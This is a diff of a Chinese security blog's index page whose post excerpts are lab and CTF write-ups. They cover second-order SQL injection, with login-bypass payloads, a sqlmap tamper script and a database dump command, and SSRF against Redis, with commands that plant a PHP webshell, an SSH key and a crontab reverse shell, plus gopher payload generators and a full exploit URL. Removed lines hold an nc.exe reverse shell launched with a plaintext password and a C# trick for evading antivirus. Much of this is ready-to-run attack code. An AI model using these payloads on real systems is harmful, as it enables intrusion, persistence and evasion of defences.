@@ -118,6 +118,358 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/" class="title">二次注入详解</a>
+    <section class="desc">
+  0x01、二次注入原理：用户提交的值未被处理（转义或过滤）就存储在数据库中，而开发人员信任来自数据库的数据，未经处理直接在其他功能中调用
+0x02、二次注入类型：
+用户提交的值未被处理（转义或过滤）就存储在数据库中，未经处理直接在其他功能中调用。（对应案例1和3）
+用户输入经过addslashes处理，但是数据库在存储过程吃掉 ‘&#39; ;再次调用时触发paylaod且绕过了addslashes等转义处理 。（对应案例2）
+
+分析几个案例更容易理解；各个案例的源码我会在文末放出
+0x03、案例1：直接以目标用户身份身份登录注册时没有经过任何任何处理，payload直接存入数据库；在登录时触发payload以目标（通常为管理员）身份登录
+注册时构造payload：
+用户名：admin&apos; -- -
+密码：password登录处验证代码：
+if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;){
+// Check if username is empty
+if(empty(trim($_POST[&quot;username&quot;]))){
+    $username_err = &apos;Please enter username.&apos;;
+} else{
+    $username = trim($_POST[&quot;username&quot;]);
+}
+
+// Check if password is empty
+if(empty(trim($_POST[&apos;password&apos;]))){
+    $password_err = &apos;Please enter your password.&apos;;
+} else{
+    $password = trim($_POST[&apos;password&apos;]);
+}
+####对用户输入没有进行特殊处理
+
+if(empty(trim($_POST[&quot;username&quot;]))){
+$username_err = &apos;Please enter username.&apos;;} else{
+    $username = trim($_POST[&quot;username&quot;]);
+  }
+
+// Check if password is empty
+if(empty(trim($_POST[&apos;password&apos;]))){
+    $password_err = &apos;Please enter your password.&apos;;
+} else{
+    $password = trim($_POST[&apos;password&apos;]);
+}
+
+// Validate credentials
+if(empty($username_err) &amp;&amp; empty($password_err)){
+    // Prepare a select statement
+    $sql = &quot;SELECT username, password FROM users WHERE username = ?&quot;;
+####此时将用户名和密码从数据库中取出----&gt;触发构造的payload  
+##SQL语句为：SELECT username, password FROM users WHERE username = &apos;admin&apos; -- - 
+##也就是取出admin账户的账户密码来做验证；所以后边的代码可以不用看都没事   
+    if($stmt = mysqli_prepare($link, $sql)){
+        // Bind variables to the prepared statement as parameters
+        mysqli_stmt_bind_param($stmt, &quot;s&quot;, $param_username);。
+###在传递给mysqli_prepare()的SQL语句中为参数标记绑定变量为用户输入
+        // Set parameters
+        $param_username = $username;
+
+        // Attempt to execute the prepared statement
+        if(mysqli_stmt_execute($stmt)){
+            // Store result
+            mysqli_stmt_store_result($stmt);     
+###获取$sql执行结果              
+            // Check if username exists, if yes then verify password
+            if(mysqli_stmt_num_rows($stmt) == 1){     ####结果集中行数等于1,即用户存在               
+                // Bind result variables
+                mysqli_stmt_bind_result($stmt, $username, $hashed_password); ###将结果集中的列绑定到变量。
+                if(mysqli_stmt_fetch($stmt)){  ###从准备好的语句中获取结果到mysqli_stmt_bind_result()绑定的变量中 。
+                    if(password_verify($password, $hashed_password)){
+                        /* Password is correct, so start a new session and
+                        save the username to the session */
+                        session_start();
+                        $_SESSION[&apos;username&apos;] = $username;      
+                        header(&quot;location: home.php&quot;);
+                    } else{
+                        // Display an error message if password is not valid
+                        $password_err = &apos;The password you entered was not valid.&apos;;
+                    }
+                }
+            } else{
+                // Display an error message if username doesn&apos;t exist
+                $username_err = &apos;No account found with that username.&apos;;
+            }
+        } else{
+            echo &quot;Oops! Something went wrong. Please try again later.&quot;;
+        }
+    }0x04、案例2：经典案例sqli-labs-24，更改管理账户密码在注册时构造payload
+用户名： admin&apos; #
+密码：password注册时对用户输入的注册用户名进行特殊字符转义
+$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;
+$pass= mysql_escape_string($_POST[&apos;password&apos;]);
+$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);
+....
+###此时payload被转义为admin\&apos;\ #
+...
+$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;
+mysql_query($sql) or die(&apos;Error Creating your user account,  : &apos;.mysql_error());
+...
+##存入数据库后payload被还原为: admin&apos; #也就是转义会被数据库吃掉，在被引用时还原为我们的paylaod；原理如下图
+
+登录时同样对用户输入进行特殊字符转义（没有进行特殊处理的话即会变成案例1）
+function sqllogin(){
+   $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
+   $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
+   $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
+//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
+   $res = mysql_query($sql) or die(&apos;You tried to be real smart, Try harder!!!! :( &apos;);
+   $row = mysql_fetch_row($res);
+//print_r($row) ;
+   if ($row[1]) {
+return $row[1];
+   } else {
+  return 0;
+   }
+}简单验证一下注册和登录流程：
+
+更改密码：
+$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
+####直接获取当前用户名进行密码更新
+###此时SQL语句： UPDATE users SET PASSWORD=&apos;password&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos;
+$res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);
+........至此完成二次注入对目标用户密码的修改
+0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入） 以HTB的NightMare靶机为例：
+注册帐户名 ： ’
+登录进入发现SQL报错
+
+初步验证注入点 ，在BurpSuit分别抓注册和登录包发送到Repeater；来回切换
+&apos; -- -  仍然报错；寻找正确闭合方式
+&quot; -- - 回显SQL报错信息
+&apos;) -- -无SQL报错信息
+1&apos;) or 1=1 #无SQL报错信息
+&apos;) order by 1000#   回显SQL报错信息
+&apos;) order by 1#  无SQL报错信息
+.....
+###最终验证出列值为 2 使用SQLMAP进行POST二次注入；编写对应tamper脚本简易思路：（难点是注册之后基于新cookie进行身份验证）我在这里找到了对应的技巧：将HTTP请求发送到主页并检索新的cookie值；将sqlmap生成HTTP请求替换Cookie值 
+https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
+https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5
+注册：register username位置填入 payload ;密码固定password=123456    
+post_data = { ‘username’:payload, ‘password’:’tw123’,’register’:’Register’ }
+然后是获取用户注册成功后返回的cookie并执行替换；使用–second-url  http://10.10.10.66/notes.php在index之后请求notes.php验证结果
+response = s.post(“http://10.10.10.66/register.php&quot;, data=post_data)
+php_cookie = re.search(‘PHPSESSID=(.*?);’, response.headers[‘Set-Cookie’]).group(1)
+最终tamper：
+#!/usr/bin/env python
+import reimport requests
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+pass
+
+def create_account(payload):
+s = requests.Session()
+
+post_data = { &apos;user&apos;:payload, &apos;pass&apos;:&apos;tw123&apos;, &apos;register&apos;:&apos;Register&apos; }
+proxies = { &apos;http&apos;:&apos;http://127.0.0.1:8080&apos; }
+response = s.post(&quot;http://10.10.10.66/register.php&quot;, data=post_data, proxies=proxies)
+php_cookie = re.search(&apos;PHPSESSID=(.*?);&apos;, response.headers[&apos;Set-Cookie&apos;]).group(1)
+
+return &quot;PHPSESSID={0}&quot;.format(php_cookie)
+
+def tamper(payload, **kwargs):
+headers = kwargs.get(&quot;headers&quot;, {})
+headers[&quot;Cookie&quot;] = create_account(payload)
+return payloadsqlmap语句：
+sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080
+
+注意点：
+
+post包中密码需要和tamper脚本中一致
+去掉login.req中的cookie那一行
+使用代理的话需要开启Burpsuit
+
+这里就直接贴最终的paylaod吧：
+sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080 --dump -D sysadmin --no-cast####需要–no-cast 参数
+0x06、总结：主要利用点还是网站对用户输入没有进行处理（这也是二次注入比较少的原因之一）；但是二次注入工具难以检测，所以危害还是很大的
+对于案例二的话应该各位表哥都玩过，所以这里着重点就是案例三中如何使用SQLMAP对二次注入进行数据查询的问题；所以这里我除了上边案例中的源码，我还另外给出了一份二次注入回显型的源码；如果各位表哥有其他更好的思路也欢迎留言
+参考链接：
+http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/
+http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html
+https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5
+
+
+</section>
+    <p class="sub">May 19, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/05/19/SSRF-Redis/" class="title">SSRF+Redis</a>
+    <section class="desc">
+  猪猪侠SSRF议题
+形成SSRF的代码示例：
+&lt;?php
+function curl($url){  
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_exec($ch);
+curl_close($ch);
+}
+$url = $_GET[&apos;url&apos;];
+curl($url);
+?&gt;SSRF绕过限制：
+利用短网址
+
+xip.io  –&gt; 127.0.0.1.xip.io
+
+@符号绕过 –&gt; www.baidu.com@127.0.0.1 —&gt;访问127.0.0.1（利用解析问题绕过）
+
+dns rebinding ： http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/
+
+更改ip地址写法，如十六进制 http://127.0.0.1 —&gt;http://0177.0.0.1
+
+协议层请求绕过  —&gt; 请求带有事先设计跳转的页面file ftp（302跳转）
+ 
+
+
+
+Redis未授权绝对路径写webshell：
+flushall
+set 1 ‘‘ 
+config set dir /var/www/html
+config set dbfilename shell.php
+save
+
+写ssh公钥：
+ssh-keygen -t rsa ###生成公钥
+flushall
+set 1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDw2hZflPUjUwuzH6yIgXRiZtBa4L9I6nFqaTH7OELXd4ErUUm4ucBcQBXJqD9wilAepPDKqVohWITXQdLUzyi7ICHrhgVELjk3JRdJ6aJFYJEtXpTi1wJYCaV1Jb9WidF7Jfb2B7rp/TWI0HOORNQJCmA04iFXRAaER1cQTq0ZW+/iB03uTrr5rbmgg/MlwJFa4vSgGSskI2xJ2NOpz4LLBQaybs8VBgr7IqaBcNl55qiZoWcILCVxSW0IyNiPVrLc1nI/oi2sOrFoaGSFFZp35ne9TKzeYyZl5LY3enX1eepNGW1MMYf5NdCcDHjvjcYVa20jqpvD6jDFhOjCfk/nMt1FTRB79LiZ/KKNkdUUZzauTqyyYjZsWKZ1+CcKjk7nVsfFINI8Ap/sGd4J/LXw5QaepKTx+DTmom7c67bYhnFheOQVWusmtghYiC/1UYIyLOayrgLiwt5xIsb5KjgMN29PJpf7zxpUV/TgbgkYLFzNt2CP5u5aWyXdRDyA/K0=
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+save
+
+写contrab定时任务反弹shell：
+
+flushall
+set 1 ‘\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n’
+config set dir /var/spool/cron/
+config set dbfilename root
+save
+
+SSRF+Redis利用
+http、https 内网服务探测
+file-读取文本
+file:///etc/passwd
+….
+dict 用于泄露软件安装版本信息探测端口、操作redis（但由于空格问题，无法正常写入文件）
+
+dict://127.0.0.1:6379/infodict://127.0.0.1:6379/getuserdict://127.0.0.1:6379/flushall
+gopher 万能协议反弹shell：(redis利用需要REST编码)
+Gopher协议中需要对paylaod进行编码；空格用%0a,回车换行使用%0d%0a，参数之间的分隔符也用URL编码转换Redis RESP格式脚本https://xz.aliyun.com/t/5665#toc-4根据需求更改payload、filename、path的值
+import urllib
+protocol=&quot;gopher://&quot;
+ip=&quot;127.0.0.1&quot;
+port=&quot;6379&quot;
+payload=&quot;\n\n&lt;?php system($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+ &quot;set 1 {}&quot;.format(payload.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+ &quot;config set dir {}&quot;.format(path),
+ &quot;config set dbfilename {}&quot;.format(filename),
+ &quot;save&quot;
+ ]
+if passwd:
+cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+CRLF=&quot;\r\n&quot;
+redis_arr = arr.split(&quot; &quot;)
+cmd=&quot;&quot;
+cmd+=&quot;*&quot;+str(len(redis_arr))
+for x in redis_arr:
+cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+cmd+=CRLF
+return cmd
+if __name__==&quot;__main__&quot;:
+for x in cmd:
+payload += urllib.quote(redis_format(x))
+print payloadubuntu无法写crontab反弹shell： https://xz.aliyun.com/t/1800
+
+SSRF利用redis之不换行
+FLUSHALL
+config set dir /var/www/html/
+set a1 ZY%16%0E%16F
+set a2 ffffff
+BITOP XOR payload a1 a2
+append payload eval($_GET[c]);%3f&gt;
+config set dbfilename cmd.php
+save
+
+Gopher有如下几点问题
+
+PHP的curl默认不跟随302跳转
+curl7.43gopher协议存在%00截断的BUG，v7.45以上可用
+file_get_contents()的SSRF，gopher协议不能使用URLencode
+file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败
+
+SSRF 打内网之POST请求(CTF题目)http://152.136.63.75:8016/index.php?url=    —&gt;存在SSRF
+目录扫描发现 http://152.136.63.75:8016/webshe11231231231.php 页面
+view-source:http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php   —&gt;file读取webshell源码
+&lt;?php
+
+$serverList = array(
+&quot;127.0.0.1&quot;
+);
+$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
+foreach ($serverList as $host) {
+if ($ip === $host) {
+if ((!empty($_POST[&apos;admin&apos;])) and $_POST[&apos;admin&apos;] === &apos;h1admin&apos;) {
+@eval($_POST[&apos;hacker&apos;]);
+} else {
+die(&quot;You aren&apos;t admin!&quot;);
+}
+} else {
+die(&apos;This is webshell&apos;);
+}
+}GET请求的话可以直接利用，但这里需要POST请求才能利用，需要进一步处理—-&gt;使用Gopher协议并对POST payload包进行编码，编码脚本如下：
+exp = &apos;&apos;&apos;\
+POST /webshe11231231231.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: deflate
+DNT: 1
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+admin=h1admin&amp;hacker=system(&apos;cat fl1234aaaaaggggg.php&apos;);
+&apos;&apos;&apos;
+import urllib
+tmp = urllib.quote(exp)
+new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)
+result = &quot;_&quot;+urllib.quote(new)
+print result更改命令的时候Content-Length的值也需要修改根据Gopher协议，编码的第一个字符无效，所以用第一位放个  “_”
+
+如上图所示，所以需要两次编码
+生成paylaod：
+kali@kali:~$ python exp.py
+_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A最后exp：
+152.136.63.75:8016/index.php?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A
+
+
+</section>
+    <p class="sub">May 19, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/" class="title">域渗透之隐藏管理员用户和派生本地管理员</a>
     <section class="desc">
   典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）
@@ -561,72 +913,6 @@ Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行
   </div>
 </div>-->
 <!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/" class="title">shell中实现runas命令</a>
-    <section class="desc">
-  有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果
-$pass = convertTo-SecureString &apos;36mEAhz/B8xQ~2VM&apos; -AsPlainText -Force                     
-$cred= New-Object System.Management.Automation.PSCredential(&quot;Sniper\Chris&quot;,$pass)
-Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证
-Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $cred
-Invoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  6636 -e cmd.exe } -Credential $cred  ##反弹shell
-
-</section>
-    <p class="sub">Apr 26, 2020</p>
-  </div>
-</div>-->
-<!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/" class="title">C#底层调用powershell过杀软</a>
-    <section class="desc">
-  这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。
-国内某数字杀软，会拦截powershell的运行，以前常用的复制powershell到当前目录执行也被拦截，或者修改empire中的特定函数同样被检测到,很多方式不再适用
-从C#中调用
-添加运行powershell需要的程序包：
-C#调用powershell安装system.management.automation.dll：
-管理NuGet程序包-&gt;浏览-&gt;搜索system.management.automation-&gt;选择system.management.automation.dll-&gt;重新生成项目即可
-using System;
- using System.Configuration.Install;
- using System.Runtime.InteropServices;
- using System.Management.Automation.Runspaces;
- public class Program
- {
- public static void Main()
- {
- }
- }
- [System.ComponentModel.RunInstaller(true)]
- public class Sample : System.Configuration.Install.Installer
- {
- public override void Uninstall(System.Collections.IDictionary savedState)
- {
- Mycode.Exec();
- }
- }
- public class Mycode
- {
- public static void Exec()
- {
- string command = System.IO.File.ReadAllText(@&quot;C:\Users\fmc\Desktop\PowerUp.ps1&quot;);
- RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
- Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
- rspace.Open();
- Pipeline pipeline = rspace.CreatePipeline();
- pipeline.Commands.AddScript(command);
- pipeline.Invoke();
- }
- }PS1文件需要适当混淆以过静态查杀
-
-
-</section>
-    <p class="sub">Apr 26, 2020</p>
-  </div>
-</div>-->
-<!---->
 <!--
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
@@ -640,6 +926,388 @@ using System;
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="二次注入详解" alt="二次注入详解" href="/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="二次注入详解" alt="二次注入详解"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 二次注入详解 &gt;</div>
+                            <div class="content flex1">
+                                
+  0x01、二次注入原理：用户提交的值未被处理（转义或过滤）就存储在数据库中，而开发人员信任来自数据库的数据，未经处理直接在其他功能中调用
+0x02、二次注入类型：
+用户提交的值未被处理（转义或过滤）就存储在数据库中，未经处理直接在其他功能中调用。（对应案例1和3）
+用户输入经过addslashes处理，但是数据库在存储过程吃掉 ‘&#39; ;再次调用时触发paylaod且绕过了addslashes等转义处理 。（对应案例2）
+
+分析几个案例更容易理解；各个案例的源码我会在文末放出
+0x03、案例1：直接以目标用户身份身份登录注册时没有经过任何任何处理，payload直接存入数据库；在登录时触发payload以目标（通常为管理员）身份登录
+注册时构造payload：
+用户名：admin&apos; -- -
+密码：password登录处验证代码：
+if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;){
+// Check if username is empty
+if(empty(trim($_POST[&quot;username&quot;]))){
+    $username_err = &apos;Please enter username.&apos;;
+} else{
+    $username = trim($_POST[&quot;username&quot;]);
+}
+
+// Check if password is empty
+if(empty(trim($_POST[&apos;password&apos;]))){
+    $password_err = &apos;Please enter your password.&apos;;
+} else{
+    $password = trim($_POST[&apos;password&apos;]);
+}
+####对用户输入没有进行特殊处理
+
+if(empty(trim($_POST[&quot;username&quot;]))){
+$username_err = &apos;Please enter username.&apos;;} else{
+    $username = trim($_POST[&quot;username&quot;]);
+  }
+
+// Check if password is empty
+if(empty(trim($_POST[&apos;password&apos;]))){
+    $password_err = &apos;Please enter your password.&apos;;
+} else{
+    $password = trim($_POST[&apos;password&apos;]);
+}
+
+// Validate credentials
+if(empty($username_err) &amp;&amp; empty($password_err)){
+    // Prepare a select statement
+    $sql = &quot;SELECT username, password FROM users WHERE username = ?&quot;;
+####此时将用户名和密码从数据库中取出----&gt;触发构造的payload  
+##SQL语句为：SELECT username, password FROM users WHERE username = &apos;admin&apos; -- - 
+##也就是取出admin账户的账户密码来做验证；所以后边的代码可以不用看都没事   
+    if($stmt = mysqli_prepare($link, $sql)){
+        // Bind variables to the prepared statement as parameters
+        mysqli_stmt_bind_param($stmt, &quot;s&quot;, $param_username);。
+###在传递给mysqli_prepare()的SQL语句中为参数标记绑定变量为用户输入
+        // Set parameters
+        $param_username = $username;
+
+        // Attempt to execute the prepared statement
+        if(mysqli_stmt_execute($stmt)){
+            // Store result
+            mysqli_stmt_store_result($stmt);     
+###获取$sql执行结果              
+            // Check if username exists, if yes then verify password
+            if(mysqli_stmt_num_rows($stmt) == 1){     ####结果集中行数等于1,即用户存在               
+                // Bind result variables
+                mysqli_stmt_bind_result($stmt, $username, $hashed_password); ###将结果集中的列绑定到变量。
+                if(mysqli_stmt_fetch($stmt)){  ###从准备好的语句中获取结果到mysqli_stmt_bind_result()绑定的变量中 。
+                    if(password_verify($password, $hashed_password)){
+                        /* Password is correct, so start a new session and
+                        save the username to the session */
+                        session_start();
+                        $_SESSION[&apos;username&apos;] = $username;      
+                        header(&quot;location: home.php&quot;);
+                    } else{
+                        // Display an error message if password is not valid
+                        $password_err = &apos;The password you entered was not valid.&apos;;
+                    }
+                }
+            } else{
+                // Display an error message if username doesn&apos;t exist
+                $username_err = &apos;No account found with that username.&apos;;
+            }
+        } else{
+            echo &quot;Oops! Something went wrong. Please try again later.&quot;;
+        }
+    }0x04、案例2：经典案例sqli-labs-24，更改管理账户密码在注册时构造payload
+用户名： admin&apos; #
+密码：password注册时对用户输入的注册用户名进行特殊字符转义
+$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;
+$pass= mysql_escape_string($_POST[&apos;password&apos;]);
+$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);
+....
+###此时payload被转义为admin\&apos;\ #
+...
+$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;
+mysql_query($sql) or die(&apos;Error Creating your user account,  : &apos;.mysql_error());
+...
+##存入数据库后payload被还原为: admin&apos; #也就是转义会被数据库吃掉，在被引用时还原为我们的paylaod；原理如下图
+
+登录时同样对用户输入进行特殊字符转义（没有进行特殊处理的话即会变成案例1）
+function sqllogin(){
+   $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
+   $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
+   $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
+//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
+   $res = mysql_query($sql) or die(&apos;You tried to be real smart, Try harder!!!! :( &apos;);
+   $row = mysql_fetch_row($res);
+//print_r($row) ;
+   if ($row[1]) {
+return $row[1];
+   } else {
+  return 0;
+   }
+}简单验证一下注册和登录流程：
+
+更改密码：
+$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
+####直接获取当前用户名进行密码更新
+###此时SQL语句： UPDATE users SET PASSWORD=&apos;password&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos;
+$res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);
+........至此完成二次注入对目标用户密码的修改
+0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入） 以HTB的NightMare靶机为例：
+注册帐户名 ： ’
+登录进入发现SQL报错
+
+初步验证注入点 ，在BurpSuit分别抓注册和登录包发送到Repeater；来回切换
+&apos; -- -  仍然报错；寻找正确闭合方式
+&quot; -- - 回显SQL报错信息
+&apos;) -- -无SQL报错信息
+1&apos;) or 1=1 #无SQL报错信息
+&apos;) order by 1000#   回显SQL报错信息
+&apos;) order by 1#  无SQL报错信息
+.....
+###最终验证出列值为 2 使用SQLMAP进行POST二次注入；编写对应tamper脚本简易思路：（难点是注册之后基于新cookie进行身份验证）我在这里找到了对应的技巧：将HTTP请求发送到主页并检索新的cookie值；将sqlmap生成HTTP请求替换Cookie值 
+https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
+https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5
+注册：register username位置填入 payload ;密码固定password=123456    
+post_data = { ‘username’:payload, ‘password’:’tw123’,’register’:’Register’ }
+然后是获取用户注册成功后返回的cookie并执行替换；使用–second-url  http://10.10.10.66/notes.php在index之后请求notes.php验证结果
+response = s.post(“http://10.10.10.66/register.php&quot;, data=post_data)
+php_cookie = re.search(‘PHPSESSID=(.*?);’, response.headers[‘Set-Cookie’]).group(1)
+最终tamper：
+#!/usr/bin/env python
+import reimport requests
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+pass
+
+def create_account(payload):
+s = requests.Session()
+
+post_data = { &apos;user&apos;:payload, &apos;pass&apos;:&apos;tw123&apos;, &apos;register&apos;:&apos;Register&apos; }
+proxies = { &apos;http&apos;:&apos;http://127.0.0.1:8080&apos; }
+response = s.post(&quot;http://10.10.10.66/register.php&quot;, data=post_data, proxies=proxies)
+php_cookie = re.search(&apos;PHPSESSID=(.*?);&apos;, response.headers[&apos;Set-Cookie&apos;]).group(1)
+
+return &quot;PHPSESSID={0}&quot;.format(php_cookie)
+
+def tamper(payload, **kwargs):
+headers = kwargs.get(&quot;headers&quot;, {})
+headers[&quot;Cookie&quot;] = create_account(payload)
+return payloadsqlmap语句：
+sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080
+
+注意点：
+
